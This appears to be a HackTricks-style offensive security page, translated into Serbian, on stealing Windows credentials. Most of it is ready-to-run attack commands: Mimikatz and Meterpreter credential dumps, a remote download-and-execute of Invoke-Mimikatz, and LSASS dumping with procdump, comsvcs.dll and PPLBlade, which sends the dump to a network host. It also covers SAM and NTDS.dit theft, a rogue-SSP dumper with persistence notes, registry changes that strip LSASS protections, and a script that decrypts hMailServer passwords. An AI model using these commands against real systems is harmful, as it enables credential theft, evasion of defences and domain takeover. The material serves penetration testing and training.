# Krađa Windows Credentials

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Pronađite druge stvari koje Mimikatz može да уради на** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Saznajte ovde o nekim mogućim zaštitama za credentials.**](credentials-protections.md) **Te zaštite mogu sprečiti Mimikatz da izvuče neke credentials.**

## Credentials with Meterpreter

Koristite [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **koji** sam napravio da **pretražite passwords i hashes** u sistemu žrtve.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Bypassing AV

### Procdump + Mimikatz

Pošto je **Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**legitiman Microsoft alat**, nije otkriven od strane Defender-a.\
Možete koristiti ovaj alat da **dump the lsass process**, **download the dump** i **izvučete** **credentials lokalno** iz dump-a.

Možete takođe koristiti [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Ovaj proces se radi automatski pomoću [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Napomena**: Neki **AV** mogu **detektovati** kao **malicious** upotrebu **procdump.exe to dump lsass.exe**, ovo je zato što **detektuju** string **"procdump.exe" and "lsass.exe"**. Zato je **stealthier** **proslediti** kao **argument** **PID** procesa lsass.exe procdump-u **umesto** imena lsass.exe.

### Dumpovanje lsass-a sa **comsvcs.dll**

DLL pod nazivom **comsvcs.dll** koji se nalazi u `C:\Windows\System32` odgovoran je za **dumping process memory** u slučaju crash-a. Ovaj DLL uključuje **funkciju** nazvanu **`MiniDumpW`**, namenjenu da se pozove korišćenjem `rundll32.exe`.\
Nije bitno šta se prosledi kao prva dva argumenta, ali treći argument je podeljen na tri komponente. ID procesa koji treba da se dump-uje čini prvu komponentu, lokacija dump fajla predstavlja drugu, a treća komponenta je isključivo reč **full**. Nema alternativnih opcija.\
Nakon parsiranja ovih triju komponenti, DLL kreira dump fajl i prebaci memoriju specificiranog procesa u taj fajl.\
Korišćenje **comsvcs.dll** je izvodljivo za dumpovanje lsass procesa, čime se eliminiše potreba za upload-om i izvršenjem procdump. Ova metoda je detaljno opisana na [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/).

The following command is employed for execution:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Možete automatizovati ovaj proces pomoću** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping lsass pomoću Task Manager-a**

1. Kliknite desnim tasterom miša na Task Bar i izaberite Task Manager
2. Kliknite na More details
3. Potražite proces "Local Security Authority Process" na kartici Processes
4. Kliknite desnim tasterom na proces "Local Security Authority Process" i izaberite "Create dump file".

### Dumping lsass pomoću procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) je Microsoft potpisani binarni fajl koji je deo [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) paketa.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpovanje lsass-a uz PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) je Protected Process Dumper Tool koji omogućava obfusciranje memory dump fajlova i njihovo prebacivanje na udaljene radne stanice bez zapisivanja na disk.

**Ključne funkcionalnosti**:

1. Zaobilaženje PPL zaštite
2. Obfusciranje memory dump fajlova radi izbegavanja Defender-ovih mehanizama detekcije zasnovanih na potpisima
3. Slanje memory dump-a pomoću RAW i SMB metoda bez zapisivanja na disk (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-based LSASS dumping without MiniDumpWriteDump

Ink Dragon isporučuje trostepeni dumper nazvan **LalsDumper** koji nikada ne poziva `MiniDumpWriteDump`, pa EDR hooks na taj API nikada ne okidaju:

1. **Stage 1 loader (`lals.exe`)** – traži u `fdp.dll` rezervisano mesto sastavljeno od 32 mala znaka `d`, prepisuje ga apsolutnom putanjom do `rtu.txt`, sprema patchovani DLL kao `nfdp.dll` i poziva `AddSecurityPackageA("nfdp","fdp")`. Ovo primorava **LSASS** da učita maliciozni DLL kao novi Security Support Provider (SSP).
2. **Stage 2 inside LSASS** – kada LSASS učita `nfdp.dll`, DLL čita `rtu.txt`, XOR-uje svaki bajt sa `0x20` i mapira dekodovani blob u memoriju pre nego što prebaci izvršavanje.
3. **Stage 3 dumper** – mapirani payload ponovo implementira MiniDump logiku koristeći **direct syscalls** rešene iz heširanih API imena (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Namenski export nazvan `Tom` otvara `%TEMP%\<pid>.ddt`, strimuje kompresovani LSASS dump u fajl i zatvara handle tako da exfiltration može da se obavi kasnije.

Operator notes:

* Držite `lals.exe`, `fdp.dll`, `nfdp.dll` i `rtu.txt` u istom direktorijumu. Stage 1 prepisuje hardkodirano rezervisano mesto apsolutnom putanjom do `rtu.txt`, pa njihovo razdvajanje prekida lanac.
* Registracija se vrši dodavanjem `nfdp` u `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Možete sami postaviti tu vrednost da biste naterali LSASS da pri svakom boot-u ponovo učita SSP.
* `%TEMP%\*.ddt` fajlovi su kompresovani dumpovi. Dekompresujte lokalno, pa ih prosledite Mimikatz/Volatility za credential extraction.
* Pokretanje `lals.exe` zahteva admin/SeTcb rights da bi `AddSecurityPackageA` uspeo; kada se poziv vrati, LSASS transparentno učitava rogue SSP i izvršava Stage 2.
* Uklanjanje DLL-a sa diska ga ne izbacuje iz LSASS. Ili obrišite registry unos i restartujte LSASS (reboot) ili ga ostavite za long-term persistence.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dump NTDS.dit sa ciljnog DC
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Dump istorije lozinki iz NTDS.dit sa ciljanog DC
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Prikaži atribut pwdLastSet za svaki NTDS.dit nalog
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

Ove datoteke bi trebalo da budu **smeštene** u _C:\windows\system32\config\SAM_ i _C:\windows\system32\config\SYSTEM._ Ali **ne možete ih jednostavno kopirati na uobičajen način** jer su zaštićene.

### Iz registra

Najlakši način da ukradete te datoteke je da dobijete kopiju iz registra:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Preuzmite** te datoteke na vašu Kali mašinu i **izvucite hashes** koristeći:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Možete kopirati zaštićene fajlove koristeći ovu uslugu. Morate biti Administrator.

#### Using vssadmin

vssadmin binarni fajl je dostupan samo u Windows Server verzijama
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Ali isto možete uraditi iz **Powershell**. Ovo je primer **kako kopirati SAM file** (koristi se hard disk "C:" i čuva se u C:\users\Public) ali ovo možete koristiti za kopiranje bilo kojeg zaštićenog fajla:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Kod iz knjige: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Na kraju, možete takođe koristiti [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) da napravite kopiju SAM, SYSTEM i ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

Fajl **NTDS.dit** se smatra srcem **Active Directory**, sadrži ključne podatke o objektima korisnika, grupama i njihovim članstvima. Tu su smešteni **password hashes** za korisnike domena. Ovaj fajl je **Extensible Storage Engine (ESE)** baza podataka i nalazi se na **_%SystemRoom%/NTDS/ntds.dit_**.

U okviru ove baze održavaju se tri glavne tabele:

- **Data Table**: Ova tabela je zadužena za čuvanje detalja o objektima kao što su korisnici i grupe.
- **Link Table**: Prati relacije, npr. članstva u grupama.
- **SD Table**: **Security descriptors** za svaki objekat su ovde pohranjeni, što obezbeđuje sigurnost i kontrolu pristupa nad čuvanim objektima.

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows koristi _Ntdsa.dll_ za interakciju sa tim fajlom i on je korišćen od strane _lsass.exe_. Zbog toga, deo fajla **NTDS.dit** može biti lociran **u memoriji `lsass`** (možete pronaći najnovije pristupane podatke verovatno zbog poboljšanja performansi korišćenjem **cache**-a).

#### Decrypting the hashes inside NTDS.dit

The hash je šifrovan 3 puta:

1. Dešifrovati Password Encryption Key (**PEK**) koristeći **BOOTKEY** i **RC4**.
2. Dešifrovati hash koristeći **PEK** i **RC4**.
3. Dešifrovati hash koristeći **DES**.

**PEK** ima istu vrednost na svakom domain controller-u, ali je šifrovan unutar fajla **NTDS.dit** pomoću **BOOTKEY** iz **SYSTEM** fajla domain controller-a (različit je između domain controller-a). Zbog toga, da biste dobili kredencijale iz NTDS.dit fajla, potrebno je imati fajlove **NTDS.dit** i **SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Copying NTDS.dit using Ntdsutil

Dostupno od Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Takođe možete koristiti [**volume shadow copy**](#stealing-sam-and-system) trik da kopirate **ntds.dit** fajl. Zapamtite da će vam takođe trebati kopija **SYSTEM fajla** (ponovo, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) trik).

### **Izdvajanje heševa iz NTDS.dit**

Kada ste **dobili** fajlove **NTDS.dit** i **SYSTEM**, možete koristiti alate kao što je _secretsdump.py_ da **izvučete heševe**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Takođe možete **automatski izvući** koristeći ispravan domain admin user:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Za **velike NTDS.dit fajlove** preporučuje se da ih izdvojite koristeći [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Takođe možete koristiti **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ ili **mimikatz** `lsadump::lsa /inject`

### **Ekstrakcija objekata domena iz NTDS.dit u SQLite bazu podataka**

NTDS objekti se mogu ekstrahovati u SQLite bazu koristeći [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Ne izvlače se samo tajne, već i kompletni objekti i njihovi atributi za dalju analizu i izvlačenje informacija kada je sirovi NTDS.dit fajl već pribavljen.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM` hive je opciona, ali omogućava dešifrovanje tajni (NT & LM hashes, supplemental credentials such as cleartext passwords, kerberos or trust keys, NT & LM password histories). Pored ostalih informacija, izdvajaju se sledeći podaci: korisnički i mašinski nalozi sa njihovim hashovima, UAC flags, vremenska oznaka poslednjeg logona i promene lozinke, opis naloga, imena, UPN, SPN, grupe i rekurzivna članstva, stablo organizacionih jedinica i članstvo, trusted domains sa tipom trusta, smerom i atributima...

## Lazagne

Preuzmite binarni fajl sa [here](https://github.com/AlessandroZ/LaZagne/releases). Možete koristiti ovaj binarni fajl da izvučete credentials iz više softvera.
```
lazagne.exe all
```
## Ostali alati za izvlačenje kredencijala iz SAM i LSASS

### Windows credentials Editor (WCE)

Ovaj alat se može koristiti za izvlačenje kredencijala iz memorije. Preuzmite ga sa: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Ekstraktuje kredencijale iz SAM fajla
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Izvlačenje credentials iz SAM fajla
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Preuzmite ga sa:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) i samo **pokrenite** ga i lozinke će biti izvučene.

## Istraživanje neaktivnih RDP sesija i oslabljavanje bezbednosnih kontrola

Ink Dragon’s FinalDraft RAT sadrži `DumpRDPHistory` tasker čije su tehnike korisne za svakog red-teamera:

### Prikupljanje telemetrije u stilu DumpRDPHistory

* **Outbound RDP targets** – parsirajte svaki korisnički hive na `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Svaki podključ sadrži ime servera, `UsernameHint`, i vreme poslednje izmene. Možete reprodukovati FinalDraft-ovu logiku pomoću PowerShell-a:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – pretražite log `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` za Event IDs **21** (successful logon) i **25** (disconnect) da mapirate ko je administrirao mašinu:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Kada saznate koji Domain Admin redovno pristupa, dumpajte LSASS (pomoću LalsDumper/Mimikatz) dok njihova **prekinuta** sesija još postoji. CredSSP + NTLM fallback ostavlja njihov verifier i tokene u LSASS-u, koje se potom mogu replay-ovati preko SMB/WinRM da se preuzme `NTDS.dit` ili postavi persistencija na domain controllers.

### Registry downgrades targeted by FinalDraft

Isti implant takođe menja nekoliko registry ključeva kako bi olakšao krađu kredencijala:
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Podešavanje `DisableRestrictedAdmin=1` primorava ponovnu upotrebu celokupnih kredencijala/tiketa tokom RDP-a, omogućavajući pass-the-hash stil pivota.
* `LocalAccountTokenFilterPolicy=1` onemogućava filtriranje tokena od strane UAC-a, pa lokalni administratori dobijaju neograničene tokene preko mreže.
* `DSRMAdminLogonBehavior=2` omogućava DSRM administratoru da se prijavi dok je DC online, dajući napadačima još jedan ugrađen nalog sa visokim privilegijama.
* `RunAsPPL=0` uklanja LSASS PPL zaštite, čineći pristup memoriji trivijalnim za dumpere kao što je LalsDumper.

## hMailServer kredencijali baze podataka (nakon kompromitacije)

hMailServer čuva svoju DB lozinku u `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` pod `[Database] Password=`. Vrednost je Blowfish-enkriptovana statičkim ključem `THIS_KEY_IS_NOT_SECRET` i sa 4-bajtnim zamenama endijanskog poretka. Koristite hex string iz INI fajla sa ovim Python snippet-om:
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
Sa lozinkom u čistom tekstu, kopirajte SQL CE bazu da biste izbegli zaključavanja fajlova, učitajte 32-bit provider i po potrebi izvršite nadogradnju pre nego što upitujete hash-ove:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
Kolona `accountpassword` koristi hMailServer hash format (hashcat mode `1421`). Cracking ovih vrednosti može obezbediti reusable credentials za WinRM/SSH pivots.
## References

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
